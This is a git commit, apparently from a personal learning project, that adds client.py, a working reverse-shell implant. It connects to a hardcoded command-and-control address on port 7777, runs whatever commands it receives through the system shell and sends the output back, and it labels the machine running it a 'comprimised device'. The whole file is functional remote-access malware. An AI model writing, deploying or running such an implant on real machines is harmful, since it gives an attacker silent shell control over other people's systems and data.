95dc7189d0bb50d1f07e61d995b837bdb7b3e5b7
RohitRamCharan777 <151624408+RohitRamCharan777@users.noreply.github.com>
2026-03-18 17:50:58 +0530

    Implement basic client-server command execution

---
+++ client.py
@@ -0,0 +1,29 @@
+import threading
+import socket
+import subprocess
+
+server_ip="192.168.152.144"
+server_port=7777
+client_socket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client_socket.connect((server_ip,server_port))
+print("comprimised device connected successfully")
+while True:
+    try:
+        commands=client_socket.recv(1024).decode()
+        print(f"command received from c2 {commands}")
+        if commands=="exit":
+            break
+        try:
+            output_to_send=subprocess.check_output(commands,shell=True,stderr=subprocess.STDOUT,text=True)
+        except subprocess.CalledProcessError as e:
+            output_to_send=e.output
+
+        if not output_to_send:
+            output_to_send="Command ececuted but no output"
+
+        print(f"sending output: {output_to_send}")
+        client_socket.send(output_to_send.encode())
+    except ConnectionResetError:
+        print("Connection error please retry")
+        break
+client_socket.close()
